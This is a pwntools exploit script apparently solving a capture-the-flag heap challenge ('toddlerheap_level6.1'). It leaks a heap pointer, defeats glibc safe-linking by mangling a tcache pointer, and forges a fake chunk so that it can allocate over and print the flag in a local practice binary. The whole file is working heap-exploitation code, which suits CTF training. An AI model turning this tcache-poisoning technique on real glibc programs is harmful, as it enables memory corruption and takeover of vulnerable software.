from pwn import * 

binary = './toddlerheap_level6.1_patched'
p = process(binary)

s = '''
b mallo c
b free
'''


p.recvuntil("Reading the flag into ")
target = int(p.recvuntil(".", drop = True).decode(), 16)

print(hex(target))

p.sendline("calloc 0 24")
p.sendline("calloc 1 24")

p.sendline("free 0")
p.sendline("free 1")

p.sendline("puts 0")



p.recvuntil("Data: ", drop = True)
heap_leak = int.from_bytes(p.recvline().strip(), 'little')




heap_leak = heap_leak << 12
chunk_addr = heap_leak + 0x390


mangled_ptr = ((chunk_addr >> 12) ^ (target - 0x8 - 0x10 - 0x10))

for i in range(2,7):
	p.sendline(f"calloc {i} 24")
for i in range(2,7):
	p.sendline(f"free {i}")

p.sendline(f"calloc 7 24")
p.sendline(f"calloc 8 24")
p.sendline(f"free 7")
p.sendline(f"free 8")



p.sendline("safer_read 8")
p.sendline(p64(mangled_ptr))



p.sendline("read_to_global 3000")
p.send(b'A' * (0x2c8 - 0x28) + p64(0) + p64(0x21) + b'B' * 0x10)



p.sendline(f"calloc 8 24")
p.sendline(f"calloc 7 24")

p.sendline("read_to_global 3000")
p.send(b'A' * 0x2c8)
p.sendline("puts 7")
gdb.attach(p, s)
p.interactive()
